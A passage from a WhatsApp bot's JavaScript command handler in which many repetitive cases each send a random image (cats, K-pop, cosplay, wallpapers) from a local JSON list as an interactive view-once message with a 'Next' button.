var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/thailand.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'vietnamese':{
await AlyaStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/vietnam.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'aesthetic':{
await AlyaStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/aesthetic.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'antiwork':{
await AlyaStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/antiwork.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'blackpink':{
await AlyaStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/blackpink.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'bike':{
await AlyaStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/bike.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'boneka':{
await AlyaStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/boneka.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'cosplay':{
await AlyaStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/cosplay.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'cat':{
await AlyaStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/cat.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'doggo':{
await AlyaStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/doggo.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'justina':{
await AlyaStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/justina.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'kayes':{
await AlyaStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/kayes.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'kpop':{
await AlyaStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/kpop.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'notnot':{
await AlyaStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/notnot.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'car':{
await AlyaStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/car.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'couplepp': case 'ppcouple': {
let anu = require('./src/media/randompics/ppcouple.json')
let random = anu[Math.floor(Math.random() * anu.length)]
AlyaBotInc.sendMessage(from, { image: { url: random.male }, caption: `Couple pp for male` }, { quoted: m })
AlyaBotInc.sendMessage(from, { image: { url: random.female }, caption: `Couple pp for female` }, { quoted: m })
}
break
case 'profilepic':  case 'profilepicture':{
await AlyaStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/profile.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'pubg':{
await AlyaStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/pubg.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'rose':{
await AlyaStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/rose.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'ryujin':{
await AlyaStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/ryujin.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'ulzzangboy':{
await AlyaStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/ulzzangboy.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'ulzzanggirl':{
await AlyaStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/ulzzanggirl.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'wallml': case 'wallpaperml':case 'mobilelegend':{
await AlyaStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/wallml.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
